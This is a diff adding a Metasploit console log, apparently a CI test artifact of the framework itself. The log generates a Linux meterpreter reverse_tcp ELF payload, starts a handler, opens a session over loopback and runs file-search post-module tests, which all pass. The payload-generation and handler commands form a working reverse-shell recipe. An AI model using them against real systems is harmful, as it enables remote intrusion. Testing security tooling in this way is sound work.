@@ -1,0 +1,31 @@
+use linux/x64/meterpreter/reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/registry[0m) [0m> generate -o /tmp/meterpreter-spec-rb-linux-x---meterpreter-reverse-tcp20220129-3317-f9cb7i -f elf MeterpreterTryToFork=false lport=6052 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> [*] Writing 250 bytes to /tmp/meterpreter-spec-rb-linux-x---meterpreter-reverse-tcp20220129-3317-f9cb7i...
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 51
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6052 
+[*] Sending stage (3012548 bytes) to 127.0.0.1
+[*] Meterpreter session 52 opened (127.0.0.1:6052 -> 127.0.0.1:40364 ) at 2022-01-29 00:43:28 +0000
+use test/search
+[4mmsf6[0m post([1m[31mtest/search[0m) [0m> run session=52 addentropy=true verbose=true
+[*] Setup: changing working directory to /tmp
+[*] Source File Name: meterpreter-test-nxdwzseh.txt
+[*] Running against session 52
+[*] Session type is meterpreter and platform is linux
+[*] Starting search tests
+[+] should search for new files
+[+] should search recursively for files
+[+] should search with globs for files
+[+] should search with globs ignoring files
+[*] Starting search date tests
+[+] should search with dates for files
+[+] should search with dates ignores new files
+[+] should search with dates ignores old files
+[+] should search with date inclusive of exact date
+[*] Testing complete in 0.430203481
+[*] Passed: 8; Failed: 0
+[*] Cleanup: changing working directory back to /home/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
